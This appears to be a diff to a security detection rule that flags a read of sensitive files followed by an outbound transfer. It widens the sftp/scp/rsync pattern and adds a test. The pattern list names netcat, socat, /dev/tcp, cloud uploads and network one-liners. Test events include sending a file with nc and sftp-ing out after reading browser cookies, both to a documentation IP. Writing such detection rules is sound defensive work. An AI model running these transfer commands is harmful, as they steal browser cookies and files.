@@ -36,7 +36,7 @@ correlation:
           e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?([\\w.~-]*/)?(nc|ncat|netcat|socat)\\s+\\S") ||
           e.command.command.matches("(?i)(^|[\\s/;&|(`])(nc|ncat|netcat|socat)\\s+-[a-z]") ||
           e.command.command.matches("/dev/(tcp|udp)/") ||
-          e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(scp|sftp|rsync)\\s[^;&|\\n]*\\s[\\w.@-]+:") ||
+          e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(scp|sftp|rsync)\\s([^;&|\\n]*\\s)?[\\w.@-]+:") ||
           e.command.command.matches("(?i)\\b(python[0-9.]*|node|deno|bun|ruby|perl|php)\\s+(-c|-e|-r)\\s[^\\n]*(requests\\.(post|put|get|patch|request)\\(|urllib\\.request|urlopen\\(|http\\.client\\.|socket\\.create_connection\\(|\\.connect\\(\\(|fetch\\(|https?\\.(request|get)\\(|net::http\\.(get|post|start)|lwp::|fsockopen\\()") ||
           e.command.command.matches("(?i)\\bgh\\s+gist\\s+create\\b") ||
           e.command.command.matches("(?i)\\b(aws\\s+s3\\s+(cp|sync|mv)|gsutil\\s+(-m\\s+)?(cp|rsync|mv)|gcloud\\s+storage\\s+(cp|rsync|mv)|az\\s+storage\\s+blob\\s+upload)\\b") ||
@@ -145,4 +145,15 @@ tests:
       - timestamp: "2026-06-13T10:00:30Z"
         event: { action: command.executed }
         command: { command: "/usr/bin/nc -w 3 203.0.113.9 4444 < /tmp/c" }
+        session: { id: s1 }
+  - name: cookies_then_sftp_host_only
+    verdict: match
+    events:
+      - timestamp: "2026-06-13T10:00:00Z"
+        event: { action: file.read }
+        file: { path: "/home/u/.mozilla/firefox/abc.default/cookies.sqlite" }
+        session: { id: s1 }
+      - timestamp: "2026-06-13T10:00:30Z"
+        event: { action: command.executed }
+        command: { command: "sftp drop@203.0.113.9:/srv/" }
         session: { id: s1 }
